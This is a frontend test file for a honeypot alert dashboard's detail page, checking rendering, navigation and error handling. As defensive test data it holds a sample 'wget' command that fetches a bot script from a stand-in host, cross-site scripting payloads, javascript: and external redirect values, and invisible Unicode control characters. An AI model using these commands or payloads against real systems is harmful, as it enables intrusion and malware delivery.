import { QueryClientProvider } from '@tanstack/react-query';
import { render, screen, waitFor, within } from '@testing-library/react';
import userEvent from '@testing-library/user-event';
import { HttpResponse, http } from 'msw';
import { MemoryRouter } from 'react-router-dom';
import { describe, expect, it } from 'vitest';

import { AppRoutes } from '../App';
import { makeAlert, makeAlerts } from '../test/fixtures';
import { deferred, renderApp } from '../test/render';
import { ALERTS_URL, SUMMARY_URL, alertUrl, server } from '../test/server';
import { createQueryClient } from '../queryClient';

/** The value shown next to a label in the alert's description list. */
function valueOf(label: string): HTMLElement {
  const term = screen.getByText(label, { selector: 'dt' });
  const value = term.parentElement?.querySelector('dd');
  if (!value) {
    throw new Error(`No value shown for "${label}".`);
  }
  return value;
}

const heading = (name: string) => screen.findByRole('heading', { level: 1, name });

/** Count requests for any alert detail, whatever its ID. */
function countDetailRequests() {
  const paths: string[] = [];
  server.use(
    http.get(`${ALERTS_URL}/*`, ({ request }) => {
      paths.push(new URL(request.url).pathname);
      return HttpResponse.json(makeAlert());
    }),
  );
  return paths;
}

describe('AlertDetailPage: loaded alert', () => {
  it('shows the alert ID in the title and every field the API returned', async () => {
    renderApp('/alerts/4');

    await heading('Alert #4');
    await screen.findByText('sess-0004');

    expect(valueOf('Alert ID')).toHaveTextContent('4');
    expect(valueOf('Time (UTC)')).toHaveTextContent('2026-08-19 18:04:00 UTC');
    expect(valueOf('Recorded timestamp')).toHaveTextContent('2026-08-19T18:04:00Z');
    expect(valueOf('Source IP')).toHaveTextContent('10.0.0.2');
    expect(valueOf('Session ID')).toHaveTextContent('sess-0004');
    expect(valueOf('Protocol')).toHaveTextContent('ssh');
    expect(valueOf('Honeypot')).toHaveTextContent('cowrie');
    expect(valueOf('Event type')).toHaveTextContent('cowrie.login.failed');
    expect(valueOf('Command')).toHaveTextContent('(none)');
    expect(valueOf('Model prediction')).toHaveTextContent('1 (inlier)');
    expect(valueOf('Anomaly score')).toHaveTextContent('0.1204');
    expect(valueOf('Anomaly flag')).toHaveTextContent('Not flagged as an anomaly');
  });

  it('shows exactly those twelve fields, and no invented ones', async () => {
    renderApp('/alerts/4');
    await screen.findByText('sess-0004');

    const labels = screen.getAllByRole('term').map((term) => term.textContent);
    expect(labels).toEqual([
      'Alert ID',
      'Time (UTC)',
      'Recorded timestamp',
      'Source IP',
      'Session ID',
      'Protocol',
      'Honeypot',
      'Event type',
      'Command',
      'Model prediction',
      'Anomaly score',
      'Anomaly flag',
    ]);
    expect(screen.getByRole('main')).not.toHaveTextContent(/severity|risk|threat/i);
  });

  it('requests exactly one alert, by its persisted ID, and nothing else for the alerts API', async () => {
    const detailPaths: string[] = [];
    const listPaths: string[] = [];
    server.use(
      http.get(alertUrl(5), ({ request }) => {
        detailPaths.push(new URL(request.url).pathname);
        return HttpResponse.json(makeAlerts()[0]);
      }),
      http.get(ALERTS_URL, ({ request }) => {
        listPaths.push(new URL(request.url).pathname);
        return HttpResponse.json(makeAlerts());
      }),
    );

    renderApp('/alerts/5');
    await screen.findByText('sess-0005');

    expect(detailPaths).toEqual(['/api/v1/alerts/5']);
    expect(listPaths).toEqual([]);
  });

  it('describes a flagged record as a statistical outlier, never a confirmed attack', async () => {
    renderApp('/alerts/5');
    await screen.findByText('sess-0005');

    expect(valueOf('Model prediction')).toHaveTextContent('-1 (outlier)');
    expect(valueOf('Anomaly flag')).toHaveTextContent('Flagged as an anomaly (statistical outlier)');
    expect(valueOf('Anomaly score')).toHaveTextContent('-0.3512');
    expect(valueOf('Anomaly score')).toHaveTextContent(/scores are not probabilities or confidence values/i);
    expect(within(screen.getByRole('main')).getByText(/it is not a confirmed attack/i)).toBeInTheDocument();
  });

  it('shows the command exactly as recorded, in a block labelled as untrusted', async () => {
    renderApp('/alerts/5');
    await screen.findByText('sess-0005');

    const command = valueOf('Command');
    expect(command.querySelector('pre')?.textContent).toBe('wget http://x.test/bot.sh -O /tmp/bot.sh');
    expect(command).toHaveTextContent(/untrusted text/i);
  });

  it('keeps line breaks and spacing in a multi-line command, and never shortens a long one', async () => {
    const command = `line one\n  indented  line\n${'x'.repeat(5000)}`;
    server.use(http.get(alertUrl(7), () => HttpResponse.json(makeAlert({ id: 7, command }))));

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Command', { selector: 'dt' })).toBeInTheDocument());

    expect(valueOf('Command').querySelector('pre')?.textContent).toBe(command);
  });

  it('renders attacker-controlled text as text, never as markup', async () => {
    const hostile = '<img src=x onerror=alert(1)>';
    server.use(
      http.get(
        alertUrl(7),
        () =>
          HttpResponse.json(
            makeAlert({
              id: 7,
              command: hostile,
              event_type: '<script>alert(2)</script>',
              source_ip: '"><svg onload=alert(3)>',
              session_id: '<b>bold</b>',
              protocol: '<i>x</i>',
              honeypot: '<u>y</u>',
            }),
          ),
      ),
    );

    const { container } = renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Command', { selector: 'dt' })).toBeInTheDocument());

    expect(container.querySelector('img, script, b, i, u, [onerror], [onload]')).toBeNull();
    expect(valueOf('Command')).toHaveTextContent(hostile);
    expect(valueOf('Event type')).toHaveTextContent('<script>alert(2)</script>');
    expect(valueOf('Source IP')).toHaveTextContent('"><svg onload=alert(3)>');
    expect(valueOf('Session ID')).toHaveTextContent('<b>bold</b>');
  });

  it('shows invisible direction and zero-width characters as markers in every text field', async () => {
    server.use(
      http.get(alertUrl(7), () =>
        HttpResponse.json(
          makeAlert({
            id: 7,
            command: 'echo \u202Eevil\u202C done\u200B',
            event_type: 'a\u200Bb',
            source_ip: '10.0.0.\u200F1',
            session_id: 's\u2066x\u2069',
            protocol: 'ssh\uFEFF',
            honeypot: 'cow\u200Drie',
            timestamp: 'later\u202E',
          }),
        ),
      ),
    );

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Command', { selector: 'dt' })).toBeInTheDocument());

    expect(valueOf('Command').querySelector('pre')?.textContent).toBe('echo [U+202E]evil[U+202C] done[U+200B]');
    expect(valueOf('Event type')).toHaveTextContent('a[U+200B]b');
    expect(valueOf('Source IP')).toHaveTextContent('10.0.0.[U+200F]1');
    expect(valueOf('Session ID')).toHaveTextContent('s[U+2066]x[U+2069]');
    expect(valueOf('Protocol')).toHaveTextContent('ssh[U+FEFF]');
    expect(valueOf('Honeypot')).toHaveTextContent('cow[U+200D]rie');
    expect(valueOf('Recorded timestamp')).toHaveTextContent('later[U+202E]');
    expect(valueOf('Time (UTC)')).toHaveTextContent('later[U+202E]');
    expect(document.body.textContent).not.toMatch(/[\u202A-\u202E\u200B-\u200F\u2066-\u2069\uFEFF]/);
  });

  it('shows a timestamp it cannot read as recorded, without inventing a time', async () => {
    server.use(http.get(alertUrl(7), () => HttpResponse.json(makeAlert({ id: 7, timestamp: '2026-02-31T10:00:00Z' }))));

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Time (UTC)', { selector: 'dt' })).toBeInTheDocument());

    expect(valueOf('Time (UTC)')).toHaveTextContent('2026-02-31T10:00:00Z');
    expect(valueOf('Time (UTC)').querySelector('time')).toBeNull();
    expect(valueOf('Recorded timestamp')).toHaveTextContent('2026-02-31T10:00:00Z');
  });

  it('shows a timestamp with an offset as UTC, and keeps the recorded text', async () => {
    server.use(
      http.get(alertUrl(7), () => HttpResponse.json(makeAlert({ id: 7, timestamp: '2026-08-19T23:30:00-05:00' }))),
    );

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Time (UTC)', { selector: 'dt' })).toBeInTheDocument());

    expect(valueOf('Time (UTC)')).toHaveTextContent('2026-08-20 04:30:00 UTC');
    expect(valueOf('Recorded timestamp')).toHaveTextContent('2026-08-19T23:30:00-05:00');
    expect(valueOf('Time (UTC)').querySelector('time')).toHaveAttribute('datetime', '2026-08-20T04:30:00.000Z');
  });

  it('labels a prediction other than -1 or 1 instead of guessing what it means', async () => {
    server.use(
      http.get(alertUrl(7), () => HttpResponse.json(makeAlert({ id: 7, prediction: 0, is_anomaly: false, score: 0 }))),
    );

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Model prediction', { selector: 'dt' })).toBeInTheDocument());

    expect(valueOf('Model prediction')).toHaveTextContent('0 (not a value this dashboard recognises)');
    expect(valueOf('Anomaly score')).toHaveTextContent('0.0000');
  });

  it('shows empty text fields as empty rather than hiding the row', async () => {
    server.use(
      http.get(alertUrl(7), () =>
        HttpResponse.json(makeAlert({ id: 7, session_id: '', protocol: '', honeypot: '', event_type: '', command: '' })),
      ),
    );

    renderApp('/alerts/7');
    await heading('Alert #7');
    await waitFor(() => expect(screen.getByText('Session ID', { selector: 'dt' })).toBeInTheDocument());

    expect(screen.getAllByRole('term')).toHaveLength(12);
    expect(valueOf('Session ID').textContent).toBe('');
    expect(valueOf('Command')).toHaveTextContent('(none)');
  });

  it('uses a description list, so each label is tied to its value', async () => {
    renderApp('/alerts/4');
    await screen.findByText('sess-0004');

    expect(screen.getAllByRole('term')).toHaveLength(12);
    expect(screen.getAllByRole('definition')).toHaveLength(12);
  });
});

describe('AlertDetailPage: navigation', () => {
  it('offers a way back to the alerts list', async () => {
    renderApp('/alerts/4');
    await screen.findByText('sess-0004');

    expect(screen.getByRole('link', { name: 'Back to alerts' })).toHaveAttribute('href', '/alerts');
  });

  it('goes back to the list with the link', async () => {
    const user = userEvent.setup();
    renderApp('/alerts/4');
    await screen.findByText('sess-0004');

    await user.click(screen.getByRole('link', { name: 'Back to alerts' }));

    expect(await screen.findByRole('table', { name: 'Persisted alerts, newest first' })).toBeInTheDocument();
    expect(screen.getByRole('heading', { level: 1, name: 'Alerts' })).toBeInTheDocument();
  });

  it('keeps the Alerts item current in the navigation on a detail page', async () => {
    renderApp('/alerts/4');
    await screen.findByText('sess-0004');

    const nav = screen.getByRole('navigation', { name: 'Primary' });
    expect(within(nav).getByRole('link', { name: 'Alerts' })).toHaveAttribute('aria-current', 'page');
    expect(within(nav).getByRole('link', { name: 'Overview' })).not.toHaveAttribute('aria-current');
  });

  it('restores the list filters it was opened from', async () => {
    renderApp({ pathname: '/alerts/4', state: { from: '?q=wget&flag=flagged' } });
    await screen.findByText('sess-0004');

    expect(screen.getByRole('link', { name: 'Back to alerts' })).toHaveAttribute('href', '/alerts?q=wget&flag=flagged');
  });

  it.each([
    ['an absolute URL', 'https://evil.test/'],
    ['a protocol-relative URL', '//evil.test'],
    ['a script URL', 'javascript:alert(1)'],
    ['a path', '/elsewhere'],
    ['a fragment', '?q=x#frag'],
    ['text with whitespace', '?q=a b'],
    ['a number', 42],
    ['null', null],
  ])('ignores a "from" value that is %s', async (_label, from) => {
    renderApp({ pathname: '/alerts/4', state: { from } });
    await screen.findByText('sess-0004');

    expect(screen.getByRole('link', { name: 'Back to alerts' })).toHaveAttribute('href', '/alerts');
  });

  it('does not move focus when the page is opened directly', async () => {
    renderApp('/alerts/4');

    const title = await heading('Alert #4');
    await screen.findByText('sess-0004');

    expect(title).not.toHaveFocus();
  });

  it('shows the right alert when moving from one to another', async () => {
    const user = userEvent.setup();
    renderApp('/alerts');
    await screen.findByRole('table', { name: 'Persisted alerts, newest first' });

    await user.click(screen.getByRole('link', { name: 'Open alert #4' }));
    await screen.findByText('sess-0004');
    await user.click(screen.getByRole('link', { name: 'Back to alerts' }));
    await user.click(await screen.findByRole('link', { name: 'Open alert #5' }));

    expect(await heading('Alert #5')).toBeInTheDocument();
    expect(await screen.findByText('sess-0005')).toBeInTheDocument();
    expect(screen.queryByText('sess-0004')).not.toBeInTheDocument();
  });
});

describe('AlertDetailPage: loading state', () => {
  it('shows a loading placeholder, with the title and the way back, until the alert arrives', async () => {
    const gate = deferred();
    server.use(
      http.get(alertUrl(4), async () => {
        await gate.promise;
        return HttpResponse.json(makeAlerts()[1]);
      }),
    );

    renderApp('/alerts/4');

    expect(screen.getByText('Loading alert…')).toBeInTheDocument();
    expect(screen.getByRole('heading', { level: 1, name: 'Alert #4' })).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Back to alerts' })).toBeInTheDocument();
    expect(screen.queryByRole('term')).not.toBeInTheDocument();

    gate.resolve();
    expect(await screen.findByText('sess-0004')).toBeInTheDocument();
    expect(screen.queryByText('Loading alert…')).not.toBeInTheDocument();
  });
});

describe('AlertDetailPage: alert not found', () => {
  it('says so, plainly, when the API answers 404', async () => {
    renderApp('/alerts/999');

    expect(await screen.findByRole('heading', { name: 'Alert not found' })).toBeInTheDocument();
    expect(screen.getByText('No persisted alert has the ID 999.')).toBeInTheDocument();
    expect(screen.getByRole('heading', { level: 1, name: 'Alert #999' })).toBeInTheDocument();
    expect(screen.queryByRole('term')).not.toBeInTheDocument();
  });

  it('is not reported as a failure: no alert role, no retry, and the way back stays', async () => {
    renderApp('/alerts/999');

    await screen.findByRole('heading', { name: 'Alert not found' });

    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
    expect(screen.queryByRole('button', { name: 'Try again' })).not.toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Back to alerts' })).toHaveAttribute('href', '/alerts');
  });

  it('asks the API once, even with the application\'s retrying client', async () => {
    let calls = 0;
    server.use(
      http.get(alertUrl(999), () => {
        calls += 1;
        return HttpResponse.json({ detail: 'Alert not found.' }, { status: 404 });
      }),
    );

    render(
      <QueryClientProvider client={createQueryClient()}>
        <MemoryRouter initialEntries={['/alerts/999']}>
          <AppRoutes />
        </MemoryRouter>
      </QueryClientProvider>,
    );
    await screen.findByRole('heading', { name: 'Alert not found' });
    await new Promise((resolve) => setTimeout(resolve, 100));

    expect(calls).toBe(1);
  });

  it('does not treat a 200 response that looks like an error body as "not found"', async () => {
    server.use(http.get(alertUrl(5), () => HttpResponse.json({ detail: 'Alert not found.' })));

    renderApp('/alerts/5');

    expect(await screen.findByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
    expect(screen.queryByRole('heading', { name: 'Alert not found' })).not.toBeInTheDocument();
  });
});

describe('AlertDetailPage: invalid alert ID in the address', () => {
  it.each([
    ['letters', 'abc'],
    ['zero', '0'],
    ['a negative number', '-3'],
    ['a fraction', '1.5'],
    ['an exponent', '1e3'],
    ['a leading zero', '007'],
    ['an enormous number', '99999999999999999999'],
    ['one past the largest safe integer', '9007199254740992'],
    ['an encoded slash', '1%2F2'],
    ['an encoded space', '%207'],
    ['a path-like value', '..%2Fsummary'],
    ['the name of another endpoint', 'summary'],
  ])('shows "Invalid alert ID" and makes no request for %s', async (_label, raw) => {
    const detailPaths = countDetailRequests();
    let summaryCalls = 0;
    server.use(
      http.get(SUMMARY_URL, () => {
        summaryCalls += 1;
        return HttpResponse.json({});
      }),
    );

    renderApp(`/alerts/${raw}`);

    expect(await screen.findByRole('heading', { name: 'Invalid alert ID' })).toBeInTheDocument();
    expect(screen.getByRole('heading', { level: 1, name: 'Alert' })).toBeInTheDocument();
    expect(screen.getByText(/positive whole numbers/i)).toBeInTheDocument();
    expect(screen.getByRole('link', { name: 'Back to alerts' })).toBeInTheDocument();
    await screen.findByText('API reachable');
    expect(detailPaths).toEqual([]);
    expect(summaryCalls).toBe(0);
  });

  it('does not echo the invalid value from the address', async () => {
    renderApp('/alerts/%3Cimg%20src=x%20onerror=alert(1)%3E');

    await screen.findByRole('heading', { name: 'Invalid alert ID' });

    expect(document.body.textContent).not.toContain('onerror');
    expect(document.querySelector('img')).toBeNull();
  });
});

describe('AlertDetailPage: API unavailable', () => {
  it('shows the unavailable state, with causes, and keeps the way back', async () => {
    server.use(http.get(alertUrl(4), () => HttpResponse.error()));

    renderApp('/alerts/4');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'Cannot reach the SecureTrap API' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('The request did not complete, so the alert could not be loaded.');
    expect(alert).toHaveTextContent(/SECURETRAP_CORS_ORIGINS/);
    expect(screen.getByRole('link', { name: 'Back to alerts' })).toBeInTheDocument();
    expect(screen.queryByRole('term')).not.toBeInTheDocument();
  });

  it('recovers when the API comes back and the user tries again', async () => {
    let calls = 0;
    server.use(
      http.get(alertUrl(4), () => {
        calls += 1;
        return calls === 1 ? HttpResponse.error() : HttpResponse.json(makeAlerts()[1]);
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts/4');
    await screen.findByRole('heading', { name: 'Cannot reach the SecureTrap API' });

    await user.click(screen.getByRole('button', { name: 'Try again' }));

    expect(await screen.findByText('sess-0004')).toBeInTheDocument();
    expect(screen.queryByRole('alert')).not.toBeInTheDocument();
    expect(calls).toBe(2);
  });
});

describe('AlertDetailPage: error states', () => {
  it('shows an error state, with the status code, when the API answers HTTP 500', async () => {
    server.use(http.get(alertUrl(4), () => HttpResponse.json({ detail: 'Internal server error.' }, { status: 500 })));

    renderApp('/alerts/4');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'The API returned an error' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('The alert could not be loaded.');
    expect(alert).toHaveTextContent('HTTP 500');
    expect(screen.queryByRole('heading', { name: 'Alert not found' })).not.toBeInTheDocument();
  });

  it('never renders server-provided error text or a stack trace', async () => {
    server.use(
      http.get(alertUrl(4), () =>
        HttpResponse.json(
          { detail: '<img src=x onerror=alert(1)> Traceback (most recent call last): File "/srv/app.py"' },
          { status: 500 },
        ),
      ),
    );

    const { container } = renderApp('/alerts/4');

    await screen.findByRole('heading', { name: 'The API returned an error' });
    expect(document.body.textContent).not.toMatch(/onerror|Traceback|app\.py/);
    expect(container.querySelector('img')).toBeNull();
  });

  it('lets the user retry after an error', async () => {
    let calls = 0;
    server.use(
      http.get(alertUrl(4), () => {
        calls += 1;
        return calls === 1 ? HttpResponse.json({}, { status: 500 }) : HttpResponse.json(makeAlerts()[1]);
      }),
    );
    const user = userEvent.setup();
    renderApp('/alerts/4');
    await screen.findByRole('heading', { name: 'The API returned an error' });

    await user.click(screen.getByRole('button', { name: 'Try again' }));

    expect(await screen.findByText('sess-0004')).toBeInTheDocument();
    expect(calls).toBe(2);
  });

  it('shows the unexpected-response state, naming the field, when the alert breaks the contract', async () => {
    server.use(http.get(alertUrl(4), () => HttpResponse.json({ ...makeAlerts()[1], is_anomaly: 'no' })));

    renderApp('/alerts/4');

    const alert = await screen.findByRole('alert');
    expect(within(alert).getByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
    expect(alert).toHaveTextContent('is_anomaly');
    expect(screen.queryByRole('term')).not.toBeInTheDocument();
  });

  it('shows the unexpected-response state when the body is a list instead of one alert', async () => {
    server.use(http.get(alertUrl(4), () => HttpResponse.json(makeAlerts())));

    renderApp('/alerts/4');

    expect(await screen.findByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
  });

  it('shows the unexpected-response state when the body is not JSON', async () => {
    server.use(
      http.get(
        alertUrl(4),
        () => new HttpResponse('<html>gateway</html>', { status: 200, headers: { 'Content-Type': 'text/html' } }),
      ),
    );

    renderApp('/alerts/4');

    expect(await screen.findByRole('heading', { name: 'Unexpected API response' })).toBeInTheDocument();
  });
});
